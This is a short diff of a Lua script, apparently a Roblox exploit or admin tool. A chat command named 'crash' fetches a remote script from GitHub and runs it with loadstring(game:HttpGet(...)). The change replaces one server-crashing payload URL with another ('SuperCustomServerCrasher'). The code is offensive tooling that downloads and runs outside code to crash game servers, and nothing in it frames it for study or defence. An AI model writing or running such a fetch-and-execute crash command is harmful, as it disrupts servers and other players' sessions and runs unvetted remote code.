@@ -167,7 +167,7 @@ end
 			end
 		elseif msg == Settings['Prefix'].."crash" then
 			if not isaop then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-TB-Crash/main/TB%20Crash%3A%20Script", true))()
+				loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 			end
 		elseif msg == Settings['Prefix'].."unad" then
 			if not isaop then
